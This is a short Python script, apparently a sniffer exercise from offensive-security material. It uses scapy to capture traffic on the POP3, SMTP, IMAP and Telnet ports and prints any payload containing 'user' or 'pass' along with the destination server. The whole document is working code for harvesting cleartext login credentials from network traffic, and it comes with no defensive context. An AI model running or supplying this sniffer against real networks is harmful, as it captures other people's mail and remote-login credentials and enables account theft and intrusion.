#!/usr/bin/env python3
# -*- code: utf-8 -*-

from scapy.all import *

# 数据包回调函数
from scapy.layers.inet import TCP, IP


def packet_callback(packet):
    print(packet.show())
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print ("[*] Server: %s" % packet[IP].dst)
            print ("[*] %s" % packet[TCP].payload)

# 开启嗅探器     
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143 or tcp port 23",prn=packet_callback,store=0)